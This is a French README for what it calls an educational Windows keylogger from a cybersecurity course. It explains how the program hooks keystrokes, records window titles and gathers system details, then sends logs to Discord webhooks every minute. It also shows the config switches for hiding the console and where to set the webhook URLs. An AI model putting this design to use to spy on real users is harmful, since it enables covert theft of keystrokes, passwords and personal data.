[README_simple.md](https://github.com/user-attachments/files/24107039/README_simple.md)

# Keylogger pédagogique (Windows) — README simple

> Projet **académique** (École 42, cybersécurité). Ce programme **journalise les frappes clavier**, collecte des **infos système** et **envoie des logs** via des **webhooks Discord**. Ce README se concentre sur l’essentiel : ce que fait le code, les paramètres modifiables, où changer les webhooks et les prérequis.

---

## 1) Ce que fait le programme (résumé du code)
- **Hook clavier**: installe `WH_KEYBOARD_LL` et capture les touches (fonction `Save(int vk)`).
- **Titre de fenêtre**: à chaque changement de fenêtre active, écrit une ligne `[Window: <titre> - at <horodatage>]`.
- **Buffer & envoi périodique**: regroupe les logs en mémoire et **toutes les 60 s** crée `logs/log_PC_<PC_ID>_<epoch>.txt` puis l’envoie via webhook.
- **Infos système**: envoie au démarrage un embed (utilisateur, nom de machine, IP locale, version Windows, archi, CPU, RAM, disque).
- **Gestion de session**: envoie un embed à la **connexion** (keylogger actif) et à la **fin** (désactivation avec raison : fermeture fenêtre, Ctrl+C, sortie normale).

---

## 2) Paramètres modifiables (dans le code)
Ces `#define` se trouvent en haut du fichier source.

```cpp
// Visibilité de la console
#define visible      // console visible
// #define invisible // décommenter pour masquer la console

// Attente pendant le démarrage du système
#define bootwait     // boucle d’attente si le système est en boot

// Format d’affichage des touches
#define FORMAT 0     // 0 = lisible; 10 = codes décimaux; 16 = hexadécimal

// Ignorer les clics souris
#define mouseignore  // ne journalise pas les clics souris

// Afficher la fenêtre/infos de debug
#define SHOW_DEBUG_WINDOW
```

> **Changer la visibilité**: commente `#define visible` et **décommente** `#define invisible` pour masquer la fenêtre console.

---

## 3) Webhooks Discord — où les changer
Les 4 URLs de webhooks sont définies **tout en haut** du fichier (`V4.1.cpp`). **Remplace-les** par tes propres URL avant de compiler.

```cpp
#define WEBHOOK_INFO "<YOUR_WEBHOOK_URL_HERE>"          // embed infos système
#define WEBHOOK_CONNEXION "<YOUR_WEBHOOK_URL_HERE>"     // embed connexion
#define WEBHOOK_LOGS "<YOUR_WEBHOOK_URL_HERE>"          // envoi fichier de logs
#define WEBHOOK_DESACTIVATION "<YOUR_WEBHOOK_URL_HERE>" // embed fin de session
```

> Recommandation : ne publie **jamais** tes webhooks en clair dans un dépôt public. Utilise des **variables d’environnement** ou un fichier `config.example.json` sans secrets.

---

## 4) Pré-requis (build & exécution)
- **OS**: Windows x64.
- **Compilateur/IDE**: Visual Studio (mode **Release** recommandé).
- **Librairies linkées**: `ws2_32`, `iphlpapi`, `psapi`, `shell32`, `ole32`.
- **Exécution**: lancer dans une **VM de test/sandbox**. Les fichiers de log sont créés dans le dossier `logs/`.

---

## 5) Disclaimer (usage pédagogique)
Ce projet est destiné **exclusivement** à la **formation en cybersécurité**. Toute utilisation en dehors d’un cadre **autorisé** est **illégale** et **contraire à l’éthique**. L’auteur **décline toute responsabilité** en cas d’usage malveillant ou non conforme. **Si vous utilisez ce code à des fins illégales, c’est votre responsabilité, pas celle de l’auteur.**

